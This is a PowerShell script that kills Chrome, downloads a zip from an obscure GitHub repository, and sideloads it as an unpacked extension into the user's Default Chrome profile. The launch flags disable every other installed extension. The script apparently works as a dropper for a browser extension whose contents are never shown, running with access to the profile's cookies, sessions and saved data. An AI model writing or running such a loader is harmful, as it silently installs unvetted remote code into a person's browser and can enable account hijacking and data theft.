# Kill any running Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force

# ---------- CONFIG ----------
$zipUrl    = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"

# Try to locate Chrome path (both 64-bit and 32-bit support)
$chromeExe = (Get-Command chrome.exe -ErrorAction SilentlyContinue).Source
if (-not $chromeExe) {
    $chromePaths = @(
        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
        "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
    )
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            $chromeExe = $path
            break
        }
    }
}
if (-not (Test-Path $chromeExe)) {
    Write-Host "[X] Chrome not found." -ForegroundColor Red
    exit
}

$workDir   = "C:\ExtTemp"
$extFolder = "$workDir\MyExtension"

# ---------- 1. Download & extract ----------
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$zipFile = "$workDir\extension.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, "$workDir\_tmp")

# Find the folder that contains manifest.json
$manifest = Get-ChildItem "$workDir\_tmp" -Recurse -Filter manifest.json | Select-Object -First 1
if (-not $manifest) { Write-Host "[X] manifest.json not found" -ForegroundColor Red; exit }
$srcFolder = $manifest.Directory.FullName

# Move extension to final clean path
if (Test-Path $extFolder) { Remove-Item $extFolder -Recurse -Force }
Move-Item $srcFolder $extFolder

# ---------- 2. Launch Chrome with extension ----------
Start-Process $chromeExe -ArgumentList @(
    "--user-data-dir=`"$env:LOCALAPPDATA\Google\Chrome\User Data`"",
    "--profile-directory=Default",
    "--load-extension=`"$extFolder`"",
    "--no-first-run",
    "--disable-extensions-except=`"$extFolder`""
)

Write-Host "[OK] Extension downloaded and loaded in Default profile." -ForegroundColor Green
